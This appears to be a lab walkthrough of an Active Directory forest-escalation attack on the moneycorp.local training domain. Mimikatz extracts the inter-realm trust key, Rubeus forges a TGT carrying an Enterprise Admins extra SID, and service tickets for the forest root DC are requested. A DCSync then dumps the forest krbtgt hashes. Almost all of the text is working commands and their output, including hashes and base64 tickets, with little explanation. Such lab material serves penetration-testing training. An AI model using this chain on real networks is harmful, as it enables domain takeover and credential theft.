- Find the Inter-Realm Trust Key.
```
PS C:\Windows\Tasks> .\mimikatz.exe

  .#####.   mimikatz 2.2.0 (x64) #19041 Dec 23 2022 16:49:51
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > https://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/

mimikatz # privilege::debug
Privilege '20' OK

mimikatz # lsadump::trust /patch

Current domain: DOLLARCORP.MONEYCORP.LOCAL (dcorp / S-1-5-21-719815819-3726368948-3917688648)

Domain: MONEYCORP.LOCAL (mcorp / S-1-5-21-335606122-960912869-3279953914)
 [  In ] DOLLARCORP.MONEYCORP.LOCAL -> MONEYCORP.LOCAL
    * 8/4/2023 2:32:49 AM - CLEAR   - eb 02 a4 29 3c 52 d7 d1 27 d6 94 27 17 ba 42 8e a2 4b f8 9d db 6c 60 af 11 4b 3d e4
        * aes256_hmac       8c3f931aefc3035a36b0e14854b10431d40e28ac9be4ac640e101556d73f52ff
        * aes128_hmac       f915097c27c90bd8f7e8c1e221188643
        * rc4_hmac_nt       15f995fad556f33d8db3535b9df77745

 [ Out ] MONEYCORP.LOCAL -> DOLLARCORP.MONEYCORP.LOCAL
    * 8/4/2023 2:32:49 AM - CLEAR   - eb 02 a4 29 3c 52 d7 d1 27 d6 94 27 17 ba 42 8e a2 4b f8 9d db 6c 60 af 11 4b 3d e4
        * aes256_hmac       a97192fd32f146cbe6c44d944a7e01420599550c0ee164292271d66768462259
        * aes128_hmac       04490f327b80c6165c525f41fc9e0b31
        * rc4_hmac_nt       15f995fad556f33d8db3535b9df77745

<snip>
```

- Forge the TGT.
```
PS C:\AD\MyTools> .\Rubeus.exe golden /rc4:15f995fad556f33d8db3535b9df77745 /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-719815819-3726368948-3917688648 /sids:S-1-5-21-335606122-960912869-3279953914-519 /user:Administrator /service:krbtgt /target:moneycorp.local /nowrap

   ______        _
  (_____ \      | |
   _____) )_   _| |__  _____ _   _  ___
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v2.2.3

[*] Action: Build TGT

[*] Building PAC

[*] Domain         : DOLLARCORP.MONEYCORP.LOCAL (DOLLARCORP)
[*] SID            : S-1-5-21-719815819-3726368948-3917688648
[*] UserId         : 500
[*] Groups         : 520,512,513,519,518
[*] ExtraSIDs      : S-1-5-21-335606122-960912869-3279953914-519
[*] ServiceKey     : 15F995FAD556F33D8DB3535B9DF77745
[*] ServiceKeyType : KERB_CHECKSUM_HMAC_MD5
[*] KDCKey         : 15F995FAD556F33D8DB3535B9DF77745
[*] KDCKeyType     : KERB_CHECKSUM_HMAC_MD5
[*] Service        : krbtgt
[*] Target         : dollarcorp.moneycorp.local

[*] Generating EncTicketPart
[*] Signing PAC
[*] Encrypting EncTicketPart
[*] Generating Ticket
[*] Generated KERB-CRED
[*] Forged a TGT for 'Administrator@dollarcorp.moneycorp.local'

[*] AuthTime       : 8/10/2023 3:11:26 AM
[*] StartTime      : 8/10/2023 3:11:26 AM
[*] EndTime        : 8/10/2023 1:11:26 PM
[*] RenewTill      : 8/17/2023 3:11:26 AM

[*] base64(ticket.kirbi):

     doIGNjCCBjKgAwIBBaEDAgEWooIFAjCCBP5hggT6MIIE9qADAgEFoRwbGkRPTExBUkNPUlAuTU9ORVlDT1JQLkxPQ0FMoi8wLaADAgECoSYwJBsGa3JidGd0Gxpkb2xsYXJjb3JwLm1vbmV5Y29ycC5sb2NhbKOCBJ4wggSaoAMCARehAwIBA6KCBIwEggSIoQe10qM+Bi1rBgq+WPP7xVdpStq1ajEEsVRhhSmwxLQOdmNek7UBlquNsvdlM32LHbPe8fXu0LKLEMcvEMyj5libJ+PvX1g72tlRZ/WRlqXsxHh9PYHEqFXJH4JvE6xtD5lTX6B3DFh2LTeLWgMZ+sOrJMh3PrkfOCYV6Gz8NVOlXeIkuY8E/kXl24Dkzc/ypUQxi/VLBVT7I5hCzve5mhRcy17YEFAETE3/kzxkL7rdZiQij6y2AQ2IptHKDqnBjCWmRqerGru8Qy/8n22A5SWWPYoyoGpyUW9CRlCslYiXxm3PT5HQVxUQ8YDBgZvwLP8QzBeiMzToFMNO4wKXCug7+qk8lspGoBr3eB/C3vOr41BIOAn5U5+5vM9L6dR0TvecBVXJQq2gS4wztKZ3NMvQeh0LG4ARHvdPWvzpFDQORNz3dD/SwX7EQxvT0ieG+3KFJ79fyDvPLIiiOW/pTJKXtTCoYmlrueLkkX4Ix6ihu+ixtuAd/88Mc9gExYoGHj4wwvbjil+WmyD5W2I8u8kjDdlr91m80QpeK4pL8DGAx3VW905CFIEiqwYXAVBdZjznrJyOQpuKbTWcYRTmFyRDcbZpTq6nH7aZoJBcPsBPjO3maQ2EiDAxwzS5V2I5YWB8PO7DVzsyoAVN8xtp3b85Jqfga2a3xm1hDAs1LCBv7OkSTw5mrzQR0Gg9Yn8nbu3fySa1qm+fg6vwmNhA6UztFck/RetBdGYHXzFtNHYLn62nogzcs3Q3IjE6J1DyK6ZBx/60Tu9DimmEWRPXxd7mJMip+1oIM/Cd847eMPr/ft/Pi073XOImHlBnloMaBVR4YQdmDXPW3axVDJ3jIw8Gx0CY5dyl5XrUQLbvF9noMdFNTO2Q/VTUNEtLFT09zSMQ2Z9RRwa/KuwHTJ18dNPtjZGXU6izTnUv5rqD5lyf26NfaSHgWKsjGwWUoMlqesC3CaILmF0pfRau83KU966exn1dgj3Q7ArWYHp8znfBuleeLFgrffCxbfHiVYKgAwQ6ZhN7klziolhjD0atk69punwyWwQvaqbie/F/wcmJCupduAkeJLr9L1KpJXILz5jxySDwHRqbI0N9xwl+j2zOUMECJrG7sAdeduaDyjUTk4mqa2sesZFqeAsm8DqBMGGEm75pdndpXzWJnQbOcBG3wvJgnyhpm5ugyWEw2+y5aAvyPTxm/7+5KnFjrnRvEbphq3auAlsenBdEwVh0ztK8Q1gz0Ok1DCnjWh1mkyS7uz91XOjCSagoXR5hugeNt+mnAyH1pkV+CKZ4JpTJwmED/FCidvaA18iW4mrGgFE2ZXa6C9IVvBC4LsBKrIlftZ15mQ5U38NCopRpDZGIzhUhL4gAwrwmijfRvBHJQ3eALSUstAqcRqTvzWEcZ3tWVulIXGyjvXyhIjwmR71017EBK/s/P+Ml0uHbNlhDtyBx5gYNDRuGQ17NQ6sjr08x7Y5virpGJGqweuJX9aNjetleA8+bpyeH4GmTFlkaXujXXSD02REMTP+53MP8e7eEspXAhxgGgO2jggEeMIIBGqADAgEAooIBEQSCAQ19ggEJMIIBBaCCAQEwgf4wgfugGzAZoAMCARehEgQQp/L6jU2aiSMyku3oFIkEp6EcGxpET0xMQVJDT1JQLk1PTkVZQ09SUC5MT0NBTKIaMBigAwIBAaERMA8bDUFkbWluaXN0cmF0b3KjBwMFAEDgAACkERgPMjAyMzA4MTAxMDIzNTRapREYDzIwMjMwODEwMTAyMzU0WqYRGA8yMDIzMDgxMDIwMjM1NFqnERgPMjAyMzA4MTcxMDIzNTRaqBwbGkRPTExBUkNPUlAuTU9ORVlDT1JQLkxPQ0FMqS8wLaADAgECoSYwJBsGa3JidGd0Gxpkb2xsYXJjb3JwLm1vbmV5Y29ycC5sb2NhbA==


PS C:\AD\MyTools> klist

Current LogonId is 0:0x500f4dc

Cached Tickets: (1)

#0>     Client: Administrator @ DOLLARCORP.MONEYCORP.LOCAL
        Server: krbtgt/dollarcorp.moneycorp.local @ DOLLARCORP.MONEYCORP.LOCAL
        KerbTicket Encryption Type: RSADSI RC4-HMAC(NT)
        Ticket Flags 0x40e00000 -> forwardable renewable initial pre_authent
        Start Time: 8/10/2023 3:11:26 (local)
        End Time:   8/10/2023 13:11:26 (local)
        Renew Time: 8/17/2023 3:11:26 (local)
        Session Key Type: RSADSI RC4-HMAC(NT)
        Cache Flags: 0x1 -> PRIMARY
        Kdc Called:

```

- Use the Golden Ticket to request a TGS for the Enterprise DC.
```
PS C:\AD\MyTools> .\Rubeus.exe asktgs /service:cifs/mcorp-dc.moneycorp.local /dc:mcorp-dc.moneycorp.local /ptt /ticket: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

   ______        _
  (_____ \      | |
   _____) )_   _| |__  _____ _   _  ___
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v2.2.3

[*] Action: Ask TGS

[*] Requesting default etypes (RC4_HMAC, AES[128/256]_CTS_HMAC_SHA1) for the service ticket
[*] Building TGS-REQ request for: 'host/mcorp-dc.moneycorp.local'
[*] Using domain controller: mcorp-dc.moneycorp.local (172.16.1.1)
[+] TGS request successful!
[+] Ticket successfully imported!
[*] base64(ticket.kirbi):

      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

  ServiceName              :  host/mcorp-dc.moneycorp.local
  ServiceRealm             :  MONEYCORP.LOCAL
  UserName                 :  Administrator
  UserRealm                :  DOLLARCORP.MONEYCORP.LOCAL
  StartTime                :  8/10/2023 3:14:16 AM
  EndTime                  :  8/10/2023 1:11:26 PM
  RenewTill                :  8/17/2023 3:11:26 AM
  Flags                    :  name_canonicalize, ok_as_delegate, pre_authent, renewable, forwardable
  KeyType                  :  aes256_cts_hmac_sha1
  Base64(key)              :  2iU39DZyhHoQjyhw4m8v8uPh6vnuMwDSZWXYihi3p58=

PS C:\AD\MyTools> dir \\mcorp-dc.moneycorp.local\c$


    Directory: \\mcorp-dc.moneycorp.local\c$


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
d-----          5/8/2021   1:20 AM                PerfLogs
d-r---        11/10/2022   9:53 PM                Program Files
d-----          5/8/2021   2:40 AM                Program Files (x86)
d-r---         8/10/2023   2:38 AM                Users
d-----         8/10/2023   2:40 AM                Windows
```

- Forge a TGS for `ldap/mcorp-dc.moneycorp.local` to launch a DCSync attack to `MCORP-DC`.
```
PS C:\AD\MyTools> .\Rubeus.exe asktgs /service:ldap/mcorp-dc.moneycorp.local /dc:mcorp-dc.moneycorp.local /ptt /ticket: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

   ______        _
  (_____ \      | |
   _____) )_   _| |__  _____ _   _  ___
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v2.2.3

[*] Action: Ask TGS

[*] Requesting default etypes (RC4_HMAC, AES[128/256]_CTS_HMAC_SHA1) for the service ticket
[*] Building TGS-REQ request for: 'ldap/mcorp-dc.moneycorp.local'
[*] Using domain controller: mcorp-dc.moneycorp.local (172.16.1.1)
[+] TGS request successful!
[+] Ticket successfully imported!
[*] base64(ticket.kirbi):

      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

  ServiceName              :  ldap/mcorp-dc.moneycorp.local
  ServiceRealm             :  MONEYCORP.LOCAL
  UserName                 :  Administrator
  UserRealm                :  DOLLARCORP.MONEYCORP.LOCAL
  StartTime                :  8/10/2023 3:27:54 AM
  EndTime                  :  8/10/2023 1:23:54 PM
  RenewTill                :  8/17/2023 3:23:54 AM
  Flags                    :  name_canonicalize, ok_as_delegate, pre_authent, renewable, forwardable
  KeyType                  :  aes256_cts_hmac_sha1
  Base64(key)              :  xN4XyA81vQfZKn6ygC4KfHjMs71eHpuR2RCawVkxZZA=


PS C:\AD\MyTools> .\mimikatz.exe

  .#####.   mimikatz 2.2.0 (x64) #19041 Dec 23 2022 16:49:51
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > https://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/

mimikatz # privilege::debug
Privilege '20' OK

mimikatz # lsadump::dcsync /user:mcorp\krbtgt /domain:moneycorp.local
[DC] 'moneycorp.local' will be the domain
[DC] 'mcorp-dc.moneycorp.local' will be the DC server
[DC] 'mcorp\krbtgt' will be the user account
[rpc] Service  : ldap
[rpc] AuthnSvc : GSS_NEGOTIATE (9)

Object RDN           : krbtgt

** SAM ACCOUNT **

SAM Username         : krbtgt
Account Type         : 30000000 ( USER_OBJECT )
User Account Control : 00000202 ( ACCOUNTDISABLE NORMAL_ACCOUNT )
Account expiration   :
Password last change : 11/11/2022 10:46:24 PM
Object Security ID   : S-1-5-21-335606122-960912869-3279953914-502
Object Relative ID   : 502

Credentials:
  Hash NTLM: a0981492d5dfab1ae0b97b51ea895ddf
    ntlm- 0: a0981492d5dfab1ae0b97b51ea895ddf
    lm  - 0: 87836055143ad5a507de2aaeb9000361

Supplemental Credentials:
* Primary:NTLM-Strong-NTOWF *
    Random Value : 7c7a5135513110d108390ee6c322423f

* Primary:Kerberos-Newer-Keys *
    Default Salt : MONEYCORP.LOCALkrbtgt
    Default Iterations : 4096
    Credentials
      aes256_hmac       (4096) : 90ec02cc0396de7e08c7d5a163c21fd59fcb9f8163254f9775fc2604b9aedb5e
      aes128_hmac       (4096) : 801bb69b81ef9283f280b97383288442
      des_cbc_md5       (4096) : c20dc80d51f7abd9

* Primary:Kerberos *
    Default Salt : MONEYCORP.LOCALkrbtgt
    Credentials
      des_cbc_md5       : c20dc80d51f7abd9

* Packages *
    NTLM-Strong-NTOWF

* Primary:WDigest *
    01  49fec950691bbeba1b0d33d5a48d0293
